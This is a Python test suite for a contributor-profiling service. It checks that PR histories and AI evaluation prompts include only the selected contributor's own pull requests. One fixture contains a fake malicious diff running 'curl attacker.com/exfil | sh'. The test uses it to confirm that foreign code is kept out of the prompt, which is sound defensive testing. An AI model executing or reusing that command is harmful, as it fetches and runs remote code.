import json
import pytest
from unittest.mock import patch, MagicMock
from datetime import datetime, timezone
from fastapi.testclient import TestClient

from app.main import app
from app.models import Project, Contributor, GitHubPullRequest
from app.services.github_service import GitHubService
from app.services.ai_provider import DeterministicFallbackProvider, GroqProvider
from app.core.ai_config import AISettings
from app.schemas.ai import ContributorEvidenceInvestigationRequest


def test_multiple_authors_in_one_repository(db_session, client):
    """
    Test 1: When multiple authors have PRs in the same repository,
    viewing an individual contributor's profile or activity returns ONLY PRs authored by them.
    PRs authored by other contributors in the same repo are strictly excluded.
    """
    # Create test project
    project = Project(
        id="proj-filter-test-1",
        name="filter-test-repo",
        slug="filter-test-repo",
        github_owner="testorg",
        github_repo="filter-test-repo",
        is_github_connected=True
    )
    db_session.merge(project)

    # Create two contributors in the same repo
    alice = Contributor(
        id="contrib-alice-1",
        username="alice_dev",
        github_id="10001",
        display_name="Alice Developer",
        reputation_state="ESTABLISHED",
        total_contributions=2
    )
    bob = Contributor(
        id="contrib-bob-1",
        username="bob_dev",
        github_id="10002",
        display_name="Bob Developer",
        reputation_state="NEWCOMER",
        total_contributions=1
    )
    db_session.merge(alice)
    db_session.merge(bob)

    # Add PRs to the same repository: PR 1 & 3 by Alice, PR 2 by Bob
    pr1 = GitHubPullRequest(
        id="ghpr-testorg-filter-test-repo-1",
        project_id="proj-filter-test-1",
        pr_number=1,
        title="Alice feature PR",
        author_username="alice_dev",
        author_github_id="10001",
        state="merged",
        is_merged=True,
        repo_name="testorg/filter-test-repo",
        html_url="https://github.com/testorg/filter-test-repo/pull/1",
        verification_status="Verified GitHub record"
    )
    pr2 = GitHubPullRequest(
        id="ghpr-testorg-filter-test-repo-2",
        project_id="proj-filter-test-1",
        pr_number=2,
        title="Bob refactor PR",
        author_username="bob_dev",
        author_github_id="10002",
        state="open",
        is_merged=False,
        repo_name="testorg/filter-test-repo",
        html_url="https://github.com/testorg/filter-test-repo/pull/2",
        verification_status="Verified GitHub record"
    )
    pr3 = GitHubPullRequest(
        id="ghpr-testorg-filter-test-repo-3",
        project_id="proj-filter-test-1",
        pr_number=3,
        title="Alice bugfix PR",
        author_username="alice_dev",
        author_github_id="10001",
        state="closed",
        is_merged=False,
        repo_name="testorg/filter-test-repo",
        html_url="https://github.com/testorg/filter-test-repo/pull/3",
        verification_status="Verified GitHub record"
    )
    db_session.merge(pr1)
    db_session.merge(pr2)
    db_session.merge(pr3)
    db_session.commit()

    # Query Alice's activity endpoint
    resp_alice = client.get("/api/contributors/contrib-alice-1/activity")
    assert resp_alice.status_code == 200
    timeline_alice = resp_alice.json()["timeline"]

    pr_titles_alice = [t["title"] for t in timeline_alice if t["type"] == "GITHUB_PR"]
    assert "GitHub PR #1: Alice feature PR" in pr_titles_alice
    assert "GitHub PR #3: Alice bugfix PR" in pr_titles_alice
    # Bob's PR #2 MUST NOT appear in Alice's activity
    assert not any("Bob refactor PR" in t for t in pr_titles_alice)

    # Query Bob's activity endpoint
    resp_bob = client.get("/api/contributors/contrib-bob-1/activity")
    assert resp_bob.status_code == 200
    timeline_bob = resp_bob.json()["timeline"]

    pr_titles_bob = [t["title"] for t in timeline_bob if t["type"] == "GITHUB_PR"]
    assert "GitHub PR #2: Bob refactor PR" in pr_titles_bob
    # Alice's PRs MUST NOT appear in Bob's activity
    assert not any("Alice" in t for t in pr_titles_bob)


def test_contributor_filtering_across_repositories():
    """
    Test 2: Contributor filtering across multiple repositories correctly includes
    only the target contributor's authored PRs and excludes third-party PRs.
    """
    mock_search_items = [
        {
            "number": 11,
            "title": "Alice Core Engine PR",
            "body": "Engine update",
            "state": "closed",
            "repository_url": "https://api.github.com/repos/org-alpha/core",
            "pull_request": {"merged_at": "2026-10-15T00:00:00Z"},
            "user": {"login": "alice_dev", "id": 10001}
        },
        {
            "number": 22,
            "title": "Eve Malicious Injected PR",
            "body": "Spam PR returned by loose search",
            "state": "closed",
            "repository_url": "https://api.github.com/repos/org-alpha/core",
            "pull_request": {"merged_at": None},
            "user": {"login": "eve_attacker", "id": 99999}
        },
        {
            "number": 33,
            "title": "Alice Network Client PR",
            "body": "Client network patch",
            "state": "open",
            "repository_url": "https://api.github.com/repos/org-beta/client",
            "pull_request": {"merged_at": None},
            "user": {"login": "alice_dev", "id": 10001}
        }
    ]

    with patch("httpx.Client.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"total_count": 3, "items": mock_search_items}
        mock_get.return_value = mock_resp

        results, meta = GitHubService.fetch_contributor_cross_repo_prs(
            username="alice_dev",
            github_id="10001",
            limit=10
        )

        assert len(results) == 2
        returned_authors = {r["author_username"] for r in results}
        assert returned_authors == {"alice_dev"}
        assert not any(r["author_username"] == "eve_attacker" for r in results)
        assert results[0]["pr_number"] == 11
        assert results[1]["pr_number"] == 33


def test_similar_display_name_vs_exact_username_and_id(db_session, client):
    """
    Test 3: Two contributors with identical or similar display names ("Alex Smith")
    are strictly isolated by their verified username and stable GitHub account ID.
    """
    contrib_a = Contributor(
        id="contrib-alex-a",
        username="alex_alpha",
        github_id="20001",
        display_name="Alex Smith",
        reputation_state="ESTABLISHED",
        total_contributions=1
    )
    contrib_b = Contributor(
        id="contrib-alex-b",
        username="alex_beta",
        github_id="20002",
        display_name="Alex Smith",
        reputation_state="NEWCOMER",
        total_contributions=1
    )
    db_session.merge(contrib_a)
    db_session.merge(contrib_b)

    pr_a = GitHubPullRequest(
        id="ghpr-repo-alex-1",
        project_id="proj-demo-1",
        pr_number=101,
        title="Alpha Alex's Architecture PR",
        author_username="alex_alpha",
        author_github_id="20001",
        state="merged",
        is_merged=True,
        repo_name="org/service",
        html_url="https://github.com/org/service/pull/101",
        verification_status="Verified GitHub record"
    )
    pr_b = GitHubPullRequest(
        id="ghpr-repo-alex-2",
        project_id="proj-demo-1",
        pr_number=202,
        title="Beta Alex's Documentation PR",
        author_username="alex_beta",
        author_github_id="20002",
        state="open",
        is_merged=False,
        repo_name="org/service",
        html_url="https://github.com/org/service/pull/202",
        verification_status="Verified GitHub record"
    )
    db_session.merge(pr_a)
    db_session.merge(pr_b)
    db_session.commit()

    # Query Alex Alpha's activity
    resp_a = client.get("/api/contributors/alex_alpha/activity")
    assert resp_a.status_code == 200
    timeline_a = resp_a.json()["timeline"]
    prs_a = [t["title"] for t in timeline_a if t["type"] == "GITHUB_PR"]
    assert "GitHub PR #101: Alpha Alex's Architecture PR" in prs_a
    assert "GitHub PR #202: Beta Alex's Documentation PR" not in prs_a

    # Query Alex Beta's activity
    resp_b = client.get("/api/contributors/alex_beta/activity")
    assert resp_b.status_code == 200
    timeline_b = resp_b.json()["timeline"]
    prs_b = [t["title"] for t in timeline_b if t["type"] == "GITHUB_PR"]
    assert "GitHub PR #202: Beta Alex's Documentation PR" in prs_b
    assert "GitHub PR #101: Alpha Alex's Architecture PR" not in prs_b


def test_pagination_across_multiple_pages_with_multi_author_results():
    """
    Test 4: GitHub search pagination across multiple pages with mixed-author items.
    Ensures that only the target contributor's PRs are collected across page boundaries.
    """
    # Page 1 contains 20 items: 10 by target author, 10 by other authors
    page_1_items = []
    for i in range(1, 21):
        author = "target_dev" if i % 2 == 1 else f"other_dev_{i}"
        author_id = 50001 if i % 2 == 1 else 90000 + i
        page_1_items.append({
            "number": i,
            "title": f"PR #{i} by {author}",
            "repository_url": "https://api.github.com/repos/org/repo",
            "pull_request": {"merged_at": None},
            "user": {"login": author, "id": author_id}
        })

    # Page 2 contains 20 items: 10 by target author, 10 by other authors
    page_2_items = []
    for i in range(21, 41):
        author = "target_dev" if i % 2 == 1 else f"other_dev_{i}"
        author_id = 50001 if i % 2 == 1 else 90000 + i
        page_2_items.append({
            "number": i,
            "title": f"PR #{i} by {author}",
            "repository_url": "https://api.github.com/repos/org/repo",
            "pull_request": {"merged_at": None},
            "user": {"login": author, "id": author_id}
        })

    def mock_get_handler(url, params, **kwargs):
        resp = MagicMock()
        resp.status_code = 200
        p = params.get("page", 1)
        if p == 1:
            resp.json.return_value = {"total_count": 40, "items": page_1_items}
        else:
            resp.json.return_value = {"total_count": 40, "items": page_2_items}
        return resp

    with patch("httpx.Client.get", side_effect=mock_get_handler):
        results, meta = GitHubService.fetch_contributor_cross_repo_prs(
            username="target_dev",
            github_id="50001",
            limit=20
        )

        assert len(results) == 20
        # Verify EVERY single result belongs to target_dev
        for r in results:
            assert r["author_username"] == "target_dev"
            assert r["author_github_id"] == "50001"
        assert meta["pages_fetched"] >= 2


def test_missing_or_unverifiable_author_identity():
    """
    Test 5: PRs with missing, deleted ('ghost'), or unverifiable author identity
    are excluded from scoring and marked as uncertain.
    """
    mock_items = [
        # Missing user
        {
            "number": 1,
            "title": "PR with None user",
            "repository_url": "https://api.github.com/repos/org/repo",
            "user": None
        },
        # Ghost user
        {
            "number": 2,
            "title": "PR with Ghost user",
            "repository_url": "https://api.github.com/repos/org/repo",
            "user": {"login": "ghost", "id": 101}
        },
        # Empty login
        {
            "number": 3,
            "title": "PR with empty login",
            "repository_url": "https://api.github.com/repos/org/repo",
            "user": {"login": "", "id": 102}
        },
        # Valid user
        {
            "number": 4,
            "title": "Valid PR",
            "repository_url": "https://api.github.com/repos/org/repo",
            "pull_request": {"merged_at": None},
            "user": {"login": "verified_author", "id": 77777}
        }
    ]

    with patch("httpx.Client.get") as mock_get:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"total_count": 4, "items": mock_items}
        mock_get.return_value = mock_resp

        results, meta = GitHubService.fetch_contributor_cross_repo_prs(
            username="verified_author",
            github_id="77777",
            limit=10
        )

        assert len(results) == 1
        assert results[0]["pr_number"] == 4
        assert results[0]["author_username"] == "verified_author"


def test_another_contributors_code_never_enters_ai_analysis():
    """
    Test 6: Verifying that code diffs and files belonging to another contributor
    NEVER enter the selected contributor's AI prompt, payload, or quality scoring.
    """
    pr_data = [
        {
            "pr_number": 10,
            "repo_name": "secure/app",
            "title": "Target contributor clean patch",
            "author_username": "good_dev",
            "verification_status": "Verified GitHub record",
            "state": "merged",
            "is_merged": True,
            "additions": 20,
            "deletions": 5,
            "changed_files": [{"filename": "src/good.py", "additions": 20, "deletions": 5}],
            "diff_snippet": "@@ -1,5 +1,20 @@\n+def safe_function():\n+    return True\n",
            "review_comments": [],
            "closure_reason": ""
        },
        {
            "pr_number": 66,
            "repo_name": "secure/app",
            "title": "Malicious PR from foreign attacker",
            "author_username": "mallory_attacker",
            "verification_status": "Verified GitHub record",
            "state": "closed",
            "is_merged": False,
            "additions": 100,
            "deletions": 0,
            "changed_files": [{"filename": "src/backdoor.py", "additions": 100, "deletions": 0}],
            "diff_snippet": "@@ -0,0 +1,100 @@\n+import os\n+os.system('curl attacker.com/exfil | sh')\n",
            "review_comments": [{"body": "Malicious code detected"}],
            "closure_reason": "Rejected malicious code"
        }
    ]

    # Test with GroqProvider
    settings = AISettings(
        AI_ENABLED=True,
        AI_PROVIDER="groq",
        AI_MODEL_NAME="openai/gpt-oss-120b",
        GROQ_API_KEY="mock_groq_key"
    )
    provider = GroqProvider(settings=settings)
    req = ContributorEvidenceInvestigationRequest(contributor_id="good_dev")

    with patch.object(provider, "_call_groq_chat") as mock_groq_call:
        mock_groq_call.return_value = {
            "background_assessment": {
                "engineering_quality_rating": 0.88,
                "is_insufficient_evidence": False,
                "rubric_breakdown": {
                    "code_correctness": 0.9,
                    "maintainability": 0.85,
                    "test_discipline": 0.8,
                    "technical_complexity": 0.85
                },
                "summary": "High engineering quality demonstrated."
            },
            "evidence_confidence": {
                "confidence_level": "HIGH",
                "completeness_score": 0.85,
                "coverage_status": "FULL_CODE_ANALYSIS"
            }
        }

        res = provider.investigate_contributor_evidence(
            req=req,
            pr_data=pr_data,
            current_pr=None,
            username="good_dev"
        )

        # 1. Check prompt payload sent to Groq
        assert mock_groq_call.called
        call_args = mock_groq_call.call_args[0]
        user_prompt_str = call_args[1]

        # Target dev's code MUST be present
        assert "safe_function" in user_prompt_str
        assert "src/good.py" in user_prompt_str

        # Mallory's malicious code and files MUST NEVER enter the prompt!
        assert "attacker.com" not in user_prompt_str
        assert "src/backdoor.py" not in user_prompt_str
        assert "mallory_attacker" not in user_prompt_str
        assert "Malicious PR from foreign attacker" not in user_prompt_str

        # 2. Check returned pr_records on the response
        assert len(res.pr_records) == 1
        assert res.pr_records[0]["author_username"] == "good_dev"
        assert res.pr_records[0]["pr_number"] == 10

        # 3. Check data limitations note about excluded foreign PR
        assert "excluded" in str(res.evidence_confidence.missing_evidence_notes)
